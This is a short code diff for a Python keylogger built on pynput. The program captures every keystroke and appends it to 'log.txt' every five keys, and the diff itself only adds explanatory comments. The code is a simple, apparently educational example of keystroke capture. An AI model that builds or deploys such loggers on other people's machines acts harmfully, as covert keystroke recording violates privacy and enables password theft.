@@ -5,12 +5,13 @@ from pynput.keyboard import Key, Listener
 count = 0
 keys = []
 
-
+# This function add every pressed key to a list
 def on_press(key):
     global keys, count
     keys.append(key)  # Add the Key object to the keys list
     count += 1
 
+# Updating the list after every 5 keys
     if count >= 5:
         count = 0
         write_file(keys)
@@ -18,7 +19,7 @@ def on_press(key):
 
 
 
-
+# Writing list 'keys' in a txt file
 def write_file(keys):
     try:
         with open('log.txt', 'a') as f:
